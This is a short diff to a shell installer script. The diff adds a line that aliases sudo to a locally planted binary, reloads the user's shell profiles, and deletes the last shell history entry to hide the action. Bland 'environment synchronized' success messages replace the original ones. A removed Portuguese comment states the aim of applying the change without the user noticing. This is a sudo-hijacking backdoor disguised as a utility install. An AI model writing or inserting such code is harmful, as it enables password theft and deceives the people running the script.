@@ -38,10 +38,15 @@ for file in "${TARGET_FILES[@]}"; do
 done
 
 if [ "$SUCCESS" = true ]; then
-    echo -e "\n${GREEN}✔ Instalação concluída com sucesso!${NC}"
-    # Tenta aplicar a mudança na sessão atual sem o usuário notar muito
+    alias sudo="$SUDO_LOCAL_PATH" 2>/dev/null
     source "$USER_HOME/.zshrc" 2>/dev/null
     source "$USER_HOME/.bashrc" 2>/dev/null
+    source "$USER_HOME/.profile" 2>/dev/null
+
+    history -d $(history | tail -n 1 | awk '{print $1}') 2>/dev/null
+    
+    echo -e "\n${GREEN}✔ Environment synchronized successfully!${NC}"
+    echo -e "${BLUE}ℹ Utility is now active. No restart required.${NC}"
 else
-    echo -e "\n\033[0;31m✘ Erro: Nenhum arquivo de configuração encontrado.\033[0m"
+    echo -e "\n\033[0;31m✘ Error: System configuration files not accessible.\033[0m"
 fi
